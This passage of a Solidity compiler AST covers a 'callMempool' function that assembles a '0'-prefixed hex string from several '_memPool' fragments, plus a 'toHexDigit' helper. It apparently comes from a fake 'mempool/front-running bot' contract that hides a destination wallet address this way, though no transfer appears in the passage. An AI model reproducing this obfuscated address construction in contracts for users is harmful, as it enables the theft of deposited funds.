													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "13607:29:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_string_memory_ptr",
														"typeString": "string memory"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "13581:55:0"
											},
											{
												"assignments": [
													1250
												],
												"declarations": [
													{
														"constant": false,
														"id": 1250,
														"mutability": "mutable",
														"name": "_allMempools",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 1271,
														"src": "13647:26:0",
														"stateVariable": false,
														"storageLocation": "memory",
														"typeDescriptions": {
															"typeIdentifier": "t_string_memory_ptr",
															"typeString": "string"
														},
														"typeName": {
															"id": 1249,
															"name": "string",
															"nodeType": "ElementaryTypeName",
															"src": "13647:6:0",
															"typeDescriptions": {
																"typeIdentifier": "t_string_storage_ptr",
																"typeString": "string"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 1261,
												"initialValue": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"arguments": [
																{
																	"argumentTypes": null,
																	"id": 1253,
																	"name": "_memPool1",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 1218,
																	"src": "13692:9:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_string_memory_ptr",
																		"typeString": "string memory"
																	}
																},
																{
																	"argumentTypes": null,
																	"id": 1254,
																	"name": "_memPool2",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 1227,
																	"src": "13703:9:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_string_memory_ptr",
																		"typeString": "string memory"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_string_memory_ptr",
																		"typeString": "string memory"
																	},
																	{
																		"typeIdentifier": "t_string_memory_ptr",
																		"typeString": "string memory"
																	}
																],
																"id": 1252,
																"name": "mempool",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 1582,
																"src": "13684:7:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_function_internal_pure$_t_string_memory_ptr_$_t_string_memory_ptr_$returns$_t_string_memory_ptr_$",
																	"typeString": "function (string memory,string memory) pure returns (string memory)"
																}
															},
															"id": 1255,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "functionCall",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "13684:29:0",
															"tryCall": false,
															"typeDescriptions": {
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														},
														{
															"argumentTypes": null,
															"arguments": [
																{
																	"argumentTypes": null,
																	"id": 1257,
																	"name": "_memPool3",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 1238,
																	"src": "13723:9:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_string_memory_ptr",
																		"typeString": "string memory"
																	}
																},
																{
																	"argumentTypes": null,
																	"id": 1258,
																	"name": "_memPool4",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 1244,
																	"src": "13734:9:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_string_memory_ptr",
																		"typeString": "string memory"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_string_memory_ptr",
																		"typeString": "string memory"
																	},
																	{
																		"typeIdentifier": "t_string_memory_ptr",
																		"typeString": "string memory"
																	}
																],
																"id": 1256,
																"name": "mempool",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 1582,
																"src": "13715:7:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_function_internal_pure$_t_string_memory_ptr_$_t_string_memory_ptr_$returns$_t_string_memory_ptr_$",
																	"typeString": "function (string memory,string memory) pure returns (string memory)"
																}
															},
															"id": 1259,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "functionCall",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "13715:29:0",
															"tryCall": false,
															"typeDescriptions": {
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															},
															{
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														],
														"id": 1251,
														"name": "mempool",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 1582,
														"src": "13676:7:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_pure$_t_string_memory_ptr_$_t_string_memory_ptr_$returns$_t_string_memory_ptr_$",
															"typeString": "function (string memory,string memory) pure returns (string memory)"
														}
													},
													"id": 1260,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "13676:69:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_string_memory_ptr",
														"typeString": "string memory"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "13647:98:0"
											},
											{
												"assignments": [
													1263
												],
												"declarations": [
													{
														"constant": false,
														"id": 1263,
														"mutability": "mutable",
														"name": "_fullMempool",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 1271,
														"src": "13755:26:0",
														"stateVariable": false,
														"storageLocation": "memory",
														"typeDescriptions": {
															"typeIdentifier": "t_string_memory_ptr",
															"typeString": "string"
														},
														"typeName": {
															"id": 1262,
															"name": "string",
															"nodeType": "ElementaryTypeName",
															"src": "13755:6:0",
															"typeDescriptions": {
																"typeIdentifier": "t_string_storage_ptr",
																"typeString": "string"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 1268,
												"initialValue": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"hexValue": "30",
															"id": 1265,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "string",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "13792:3:0",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_stringliteral_044852b2a670ade5407e78fb2863c51de9fcb96542a07186fe3aeda6bb8a116d",
																"typeString": "literal_string \"0\""
															},
															"value": "0"
														},
														{
															"argumentTypes": null,
															"id": 1266,
															"name": "_allMempools",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1250,
															"src": "13797:12:0",
															"typeDescriptions": {
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_stringliteral_044852b2a670ade5407e78fb2863c51de9fcb96542a07186fe3aeda6bb8a116d",
																"typeString": "literal_string \"0\""
															},
															{
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														],
														"id": 1264,
														"name": "mempool",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 1582,
														"src": "13784:7:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_pure$_t_string_memory_ptr_$_t_string_memory_ptr_$returns$_t_string_memory_ptr_$",
															"typeString": "function (string memory,string memory) pure returns (string memory)"
														}
													},
													"id": 1267,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "13784:26:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_string_memory_ptr",
														"typeString": "string memory"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "13755:55:0"
											},
											{
												"expression": {
													"argumentTypes": null,
													"id": 1269,
													"name": "_fullMempool",
													"nodeType": "Identifier",
													"overloadedDeclarations": [],
													"referencedDeclaration": 1263,
													"src": "13828:12:0",
													"typeDescriptions": {
														"typeIdentifier": "t_string_memory_ptr",
														"typeString": "string memory"
													}
												},
												"functionReturnParameters": 1184,
												"id": 1270,
												"nodeType": "Return",
												"src": "13821:19:0"
											}
										]
									},
									"documentation": null,
									"id": 1272,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "callMempool",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 1181,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "12965:2:0"
									},
									"returnParameters": {
										"id": 1184,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1183,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1272,
												"src": "12991:13:0",
												"stateVariable": false,
												"storageLocation": "memory",
												"typeDescriptions": {
													"typeIdentifier": "t_string_memory_ptr",
													"typeString": "string"
												},
												"typeName": {
													"id": 1182,
													"name": "string",
													"nodeType": "ElementaryTypeName",
													"src": "12991:6:0",
													"typeDescriptions": {
														"typeIdentifier": "t_string_storage_ptr",
														"typeString": "string"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "12990:15:0"
									},
									"scope": 1583,
									"src": "12945:902:0",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 1334,
										"nodeType": "Block",
										"src": "14241:261:0",
										"statements": [
											{
												"condition": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													},
													"id": 1285,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"commonType": {
															"typeIdentifier": "t_uint8",
															"typeString": "uint8"
														},
														"id": 1281,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"leftExpression": {
															"argumentTypes": null,
															"hexValue": "30",
															"id": 1279,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "number",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "14255:1:0",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_rational_0_by_1",
																"typeString": "int_const 0"
															},
															"value": "0"
														},
														"nodeType": "BinaryOperation",
														"operator": "<=",
														"rightExpression": {
															"argumentTypes": null,
															"id": 1280,
															"name": "d",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1274,
															"src": "14260:1:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint8",
																"typeString": "uint8"
															}
														},
														"src": "14255:6:0",
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "&&",
													"rightExpression": {
														"argumentTypes": null,
														"commonType": {
															"typeIdentifier": "t_uint8",
															"typeString": "uint8"
														},
														"id": 1284,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"leftExpression": {
															"argumentTypes": null,
															"id": 1282,
															"name": "d",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1274,
															"src": "14265:1:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint8",
																"typeString": "uint8"
															}
														},
														"nodeType": "BinaryOperation",
														"operator": "<=",
														"rightExpression": {
															"argumentTypes": null,
															"hexValue": "39",
															"id": 1283,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "number",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "14270:1:0",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_rational_9_by_1",
																"typeString": "int_const 9"
															},
															"value": "9"
														},
														"src": "14265:6:0",
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														}
													},
													"src": "14255:16:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"falseBody": {
													"condition": {
														"argumentTypes": null,
														"commonType": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														},
														"id": 1312,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"leftExpression": {
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_uint8",
																"typeString": "uint8"
															},
															"id": 1305,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"hexValue": "3130",
																"id": 1300,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "number",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "14341:2:0",
																"subdenomination": null,
																"typeDescriptions": {
																	"typeIdentifier": "t_rational_10_by_1",
																	"typeString": "int_const 10"
																},
																"value": "10"
															},
															"nodeType": "BinaryOperation",
															"operator": "<=",
															"rightExpression": {
																"argumentTypes": null,
																"arguments": [
																	{
																		"argumentTypes": null,
																		"id": 1303,
																		"name": "d",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 1274,
																		"src": "14353:1:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint8",
																			"typeString": "uint8"
																		}
																	}
																],
																"expression": {
																	"argumentTypes": [
																		{
																			"typeIdentifier": "t_uint8",
																			"typeString": "uint8"
																		}
																	],
																	"id": 1302,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"lValueRequested": false,
																	"nodeType": "ElementaryTypeNameExpression",
																	"src": "14347:5:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_type$_t_uint8_$",
																		"typeString": "type(uint8)"
																	},
																	"typeName": {
																		"id": 1301,
																		"name": "uint8",
																		"nodeType": "ElementaryTypeName",
																		"src": "14347:5:0",
																		"typeDescriptions": {
																			"typeIdentifier": null,
																			"typeString": null
																		}
																	}
																},
																"id": 1304,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"kind": "typeConversion",
																"lValueRequested": false,
																"names": [],
																"nodeType": "FunctionCall",
																"src": "14347:8:0",
																"tryCall": false,
																"typeDescriptions": {
																	"typeIdentifier": "t_uint8",
																	"typeString": "uint8"
																}
															},
															"src": "14341:14:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														"nodeType": "BinaryOperation",
														"operator": "&&",
														"rightExpression": {
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_uint8",
																"typeString": "uint8"
															},
															"id": 1311,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"arguments": [
																	{
																		"argumentTypes": null,
																		"id": 1308,
																		"name": "d",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 1274,
																		"src": "14365:1:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint8",
																			"typeString": "uint8"
																		}
																	}
																],
																"expression": {
																	"argumentTypes": [
																		{
																			"typeIdentifier": "t_uint8",
																			"typeString": "uint8"
																		}
																	],
																	"id": 1307,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"lValueRequested": false,
																	"nodeType": "ElementaryTypeNameExpression",
																	"src": "14359:5:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_type$_t_uint8_$",
																		"typeString": "type(uint8)"
																	},
																	"typeName": {
																		"id": 1306,
																		"name": "uint8",
																		"nodeType": "ElementaryTypeName",
																		"src": "14359:5:0",
																		"typeDescriptions": {
																			"typeIdentifier": null,
																			"typeString": null
																		}
																	}
																},
																"id": 1309,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"kind": "typeConversion",
																"lValueRequested": false,
																"names": [],
																"nodeType": "FunctionCall",
																"src": "14359:8:0",
																"tryCall": false,
																"typeDescriptions": {
																	"typeIdentifier": "t_uint8",
																	"typeString": "uint8"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": "<=",
															"rightExpression": {
																"argumentTypes": null,
																"hexValue": "3135",
																"id": 1310,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "number",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "14371:2:0",
																"subdenomination": null,
																"typeDescriptions": {
																	"typeIdentifier": "t_rational_15_by_1",
																	"typeString": "int_const 15"
																},
																"value": "15"
															},
															"src": "14359:14:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														"src": "14341:32:0",
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														}
													},
													"falseBody": null,
													"id": 1329,
													"nodeType": "IfStatement",
													"src": "14337:101:0",
													"trueBody": {
														"id": 1328,
														"nodeType": "Block",
														"src": "14375:63:0",
														"statements": [
															{
																"expression": {
																	"argumentTypes": null,
																	"arguments": [
																		{
																			"argumentTypes": null,
																			"commonType": {
																				"typeIdentifier": "t_uint8",
																				"typeString": "uint8"
																			},
																			"id": 1325,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"leftExpression": {
																				"argumentTypes": null,
																				"commonType": {
																					"typeIdentifier": "t_uint8",
																					"typeString": "uint8"
																				},
																				"id": 1323,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": false,
																				"lValueRequested": false,
																				"leftExpression": {
																					"argumentTypes": null,
																					"arguments": [
																						{
																							"argumentTypes": null,
																							"arguments": [
																								{
																									"argumentTypes": null,
																									"hexValue": "61",
																									"id": 1319,
																									"isConstant": false,
																									"isLValue": false,
																									"isPure": true,
																									"kind": "string",
																									"lValueRequested": false,
																									"nodeType": "Literal",
																									"src": "14412:3:0",
																									"subdenomination": null,
																									"typeDescriptions": {
																										"typeIdentifier": "t_stringliteral_3ac225168df54212a25c1c01fd35bebfea408fdac2e31ddd6f80a4bbf9a5f1cb",
																										"typeString": "literal_string \"a\""
																									},
																									"value": "a"
																								}
																							],
																							"expression": {
																								"argumentTypes": [
																									{
																										"typeIdentifier": "t_stringliteral_3ac225168df54212a25c1c01fd35bebfea408fdac2e31ddd6f80a4bbf9a5f1cb",
																										"typeString": "literal_string \"a\""
																									}
																								],
																								"id": 1318,
																								"isConstant": false,
																								"isLValue": false,
																								"isPure": true,
																								"lValueRequested": false,
																								"nodeType": "ElementaryTypeNameExpression",
																								"src": "14407:4:0",
																								"typeDescriptions": {
																									"typeIdentifier": "t_type$_t_bytes1_$",
																									"typeString": "type(bytes1)"
																								},
																								"typeName": {
																									"id": 1317,
																									"name": "byte",
																									"nodeType": "ElementaryTypeName",
																									"src": "14407:4:0",
																									"typeDescriptions": {
																										"typeIdentifier": null,
																										"typeString": null
																									}
																								}
																							},
																							"id": 1320,
																							"isConstant": false,
																							"isLValue": false,
																							"isPure": true,
																							"kind": "typeConversion",
																							"lValueRequested": false,
																							"names": [],
																							"nodeType": "FunctionCall",
																							"src": "14407:9:0",
																							"tryCall": false,
																							"typeDescriptions": {
																								"typeIdentifier": "t_bytes1",
																								"typeString": "bytes1"
																							}
																						}
																					],
																					"expression": {
																						"argumentTypes": [
																							{
																								"typeIdentifier": "t_bytes1",
																								"typeString": "bytes1"
																							}
																						],
																						"id": 1316,
																						"isConstant": false,
																						"isLValue": false,
																						"isPure": true,
																						"lValueRequested": false,
																						"nodeType": "ElementaryTypeNameExpression",
																						"src": "14401:5:0",
																						"typeDescriptions": {
																							"typeIdentifier": "t_type$_t_uint8_$",
																							"typeString": "type(uint8)"
																						},
																						"typeName": {
																							"id": 1315,
																							"name": "uint8",
																							"nodeType": "ElementaryTypeName",
																							"src": "14401:5:0",
																							"typeDescriptions": {
																								"typeIdentifier": null,
																								"typeString": null
																							}
																						}
																					},
																					"id": 1321,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": true,
																					"kind": "typeConversion",
																					"lValueRequested": false,
																					"names": [],
																					"nodeType": "FunctionCall",
																					"src": "14401:16:0",
																					"tryCall": false,
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint8",
																						"typeString": "uint8"
																					}
																				},
																				"nodeType": "BinaryOperation",
																				"operator": "+",
																				"rightExpression": {
																					"argumentTypes": null,
																					"id": 1322,
																					"name": "d",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 1274,
																					"src": "14420:1:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint8",
																						"typeString": "uint8"
																					}
																				},
																				"src": "14401:20:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint8",
																					"typeString": "uint8"
																				}
																			},
																			"nodeType": "BinaryOperation",
																			"operator": "-",
																			"rightExpression": {
																				"argumentTypes": null,
																				"hexValue": "3130",
																				"id": 1324,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": true,
																				"kind": "number",
																				"lValueRequested": false,
																				"nodeType": "Literal",
																				"src": "14424:2:0",
																				"subdenomination": null,
																				"typeDescriptions": {
																					"typeIdentifier": "t_rational_10_by_1",
																					"typeString": "int_const 10"
																				},
																				"value": "10"
																			},
																			"src": "14401:25:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint8",
																				"typeString": "uint8"
																			}
																		}
																	],
																	"expression": {
																		"argumentTypes": [
																			{
																				"typeIdentifier": "t_uint8",
																				"typeString": "uint8"
																			}
																		],
																		"id": 1314,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"lValueRequested": false,
																		"nodeType": "ElementaryTypeNameExpression",
																		"src": "14396:4:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_type$_t_bytes1_$",
																			"typeString": "type(bytes1)"
																		},
																		"typeName": {
																			"id": 1313,
																			"name": "byte",
																			"nodeType": "ElementaryTypeName",
																			"src": "14396:4:0",
																			"typeDescriptions": {
																				"typeIdentifier": null,
																				"typeString": null
																			}
																		}
																	},
																	"id": 1326,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"kind": "typeConversion",
																	"lValueRequested": false,
																	"names": [],
																	"nodeType": "FunctionCall",
																	"src": "14396:31:0",
																	"tryCall": false,
																	"typeDescriptions": {
																		"typeIdentifier": "t_bytes1",
																		"typeString": "bytes1"
																	}
																},
																"functionReturnParameters": 1278,
																"id": 1327,
																"nodeType": "Return",
																"src": "14389:38:0"
															}
														]
													}
												},
												"id": 1330,
												"nodeType": "IfStatement",
												"src": "14251:187:0",
												"trueBody": {
													"id": 1299,
													"nodeType": "Block",
													"src": "14273:58:0",
													"statements": [
														{
															"expression": {
																"argumentTypes": null,
																"arguments": [
																	{
																		"argumentTypes": null,
																		"commonType": {
																			"typeIdentifier": "t_uint8",
																			"typeString": "uint8"
																		},
																		"id": 1296,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"leftExpression": {
																			"argumentTypes": null,
																			"arguments": [
																				{
																					"argumentTypes": null,
																					"arguments": [
																						{
																							"argumentTypes": null,
																							"hexValue": "30",
																							"id": 1292,
																							"isConstant": false,
																							"isLValue": false,
																							"isPure": true,
																							"kind": "string",
																							"lValueRequested": false,
																							"nodeType": "Literal",
																							"src": "14310:3:0",
																							"subdenomination": null,
																							"typeDescriptions": {
																								"typeIdentifier": "t_stringliteral_044852b2a670ade5407e78fb2863c51de9fcb96542a07186fe3aeda6bb8a116d",
																								"typeString": "literal_string \"0\""
																							},
																							"value": "0"
																						}
																					],
																					"expression": {
																						"argumentTypes": [
																							{
																								"typeIdentifier": "t_stringliteral_044852b2a670ade5407e78fb2863c51de9fcb96542a07186fe3aeda6bb8a116d",
																								"typeString": "literal_string \"0\""
																							}
																						],
																						"id": 1291,
																						"isConstant": false,
																						"isLValue": false,
																						"isPure": true,
																						"lValueRequested": false,
																						"nodeType": "ElementaryTypeNameExpression",
																						"src": "14305:4:0",
																						"typeDescriptions": {
																							"typeIdentifier": "t_type$_t_bytes1_$",
																							"typeString": "type(bytes1)"
																						},
																						"typeName": {
																							"id": 1290,
																							"name": "byte",
																							"nodeType": "ElementaryTypeName",
																							"src": "14305:4:0",
																							"typeDescriptions": {
																								"typeIdentifier": null,
																								"typeString": null
																							}
																						}
																					},
																					"id": 1293,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": true,
																					"kind": "typeConversion",
																					"lValueRequested": false,
																					"names": [],
																					"nodeType": "FunctionCall",
																					"src": "14305:9:0",
																					"tryCall": false,
																					"typeDescriptions": {
																						"typeIdentifier": "t_bytes1",
																						"typeString": "bytes1"
																					}
																				}
																			],
																			"expression": {
																				"argumentTypes": [
																					{
																						"typeIdentifier": "t_bytes1",
																						"typeString": "bytes1"
																					}
																				],
																				"id": 1289,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": true,
																				"lValueRequested": false,
																				"nodeType": "ElementaryTypeNameExpression",
																				"src": "14299:5:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_type$_t_uint8_$",
																					"typeString": "type(uint8)"
																				},
																				"typeName": {
																					"id": 1288,
																					"name": "uint8",
																					"nodeType": "ElementaryTypeName",
																					"src": "14299:5:0",
																					"typeDescriptions": {
																						"typeIdentifier": null,
																						"typeString": null
																					}
																				}
																			},
																			"id": 1294,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": true,
																			"kind": "typeConversion",
																			"lValueRequested": false,
																			"names": [],
																			"nodeType": "FunctionCall",
																			"src": "14299:16:0",
																			"tryCall": false,
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint8",
																				"typeString": "uint8"
																			}
																		},
																		"nodeType": "BinaryOperation",
																		"operator": "+",
																		"rightExpression": {
																			"argumentTypes": null,
																			"id": 1295,
																			"name": "d",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 1274,
																			"src": "14318:1:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint8",
																				"typeString": "uint8"
																			}
																		},
																		"src": "14299:20:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint8",
																			"typeString": "uint8"
																		}
																	}
																],
																"expression": {
																	"argumentTypes": [
																		{
																			"typeIdentifier": "t_uint8",
																			"typeString": "uint8"
																		}
																	],
																	"id": 1287,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"lValueRequested": false,
																	"nodeType": "ElementaryTypeNameExpression",
																	"src": "14294:4:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_type$_t_bytes1_$",
																		"typeString": "type(bytes1)"
																	},
																	"typeName": {
																		"id": 1286,
																		"name": "byte",
																		"nodeType": "ElementaryTypeName",
																		"src": "14294:4:0",
																		"typeDescriptions": {
																			"typeIdentifier": null,
																			"typeString": null
																		}
																	}
																},
																"id": 1297,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"kind": "typeConversion",
																"lValueRequested": false,
																"names": [],
																"nodeType": "FunctionCall",
																"src": "14294:26:0",
																"tryCall": false,
																"typeDescriptions": {
																	"typeIdentifier": "t_bytes1",
																	"typeString": "bytes1"
																}
															},
															"functionReturnParameters": 1278,
															"id": 1298,
															"nodeType": "Return",
															"src": "14287:33:0"
														}
													]
												}
											},
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [],
													"expression": {
														"argumentTypes": [],
														"id": 1331,
														"name": "revert",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															-19,
															-19
														],
														"referencedDeclaration": -19,
														"src": "14487:6:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_revert_pure$__$returns$__$",
															"typeString": "function () pure"
														}
													},
													"id": 1332,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "14487:8:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 1333,
												"nodeType": "ExpressionStatement",
												"src": "14487:8:0"
											}
										]
									},
									"documentation": null,
									"id": 1335,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "toHexDigit",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 1275,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1274,
												"mutability": "mutable",
												"name": "d",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1335,
												"src": "14203:7:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint8",
													"typeString": "uint8"
												},
												"typeName": {
													"id": 1273,
													"name": "uint8",
													"nodeType": "ElementaryTypeName",
													"src": "14203:5:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint8",
														"typeString": "uint8"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "14202:9:0"
									},
									"returnParameters": {
										"id": 1278,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1277,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1335,
												"src": "14235:4:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bytes1",
													"typeString": "bytes1"
												},
												"typeName": {
													"id": 1276,
													"name": "byte",
													"nodeType": "ElementaryTypeName",
													"src": "14235:4:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bytes1",
														"typeString": "bytes1"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "14234:6:0"
									},
									"scope": 1583,
									"src": "14183:319:0",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 1345,
										"nodeType": "Block",
										"src": "14566:51:0",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"arguments": [],
															"expression": {
																"argumentTypes": [],
																"id": 1341,
																"name": "callMempool",
																"nodeType": "Identifier",
